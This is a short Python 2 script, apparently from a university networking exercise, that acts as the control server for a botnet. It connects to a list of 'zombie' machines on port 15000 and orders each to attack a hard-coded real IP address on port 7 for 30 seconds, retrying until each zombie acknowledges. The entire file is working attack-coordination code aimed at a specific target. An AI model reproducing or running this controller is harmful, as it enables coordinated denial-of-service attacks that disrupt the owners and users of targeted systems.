import socket
import time
import sys

# Possible addition: Have the control server listen on a port for zombies to add, registers them
# In a CSV, reads the CSV on attack

# Each zombie registers its address and an open port to send attack to
ZOMBIES = ["cbou.cs.washington.edu"] #"108.179.184.63", "cbou.cs.washington.edu"]#, "cbou.cs.washington.edu"]
PORT = 15000
TIMEOUT = 30
TARGET = "108.179.185.41"
TARGET_PORT = 7

for zombie in ZOMBIES:
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            data = "{0} {1} {2}".format(TIMEOUT, TARGET, TARGET_PORT)
            sock.connect((zombie, PORT))
            sock.sendall(data + "\n")
            rec = sock.recv(1024)
            if rec == "ACK":
                sock.close()
                print "Zombie: {0} initiated".format(zombie)
                break
        except:
            print sys.exc_info()[0]
            time.sleep(3)
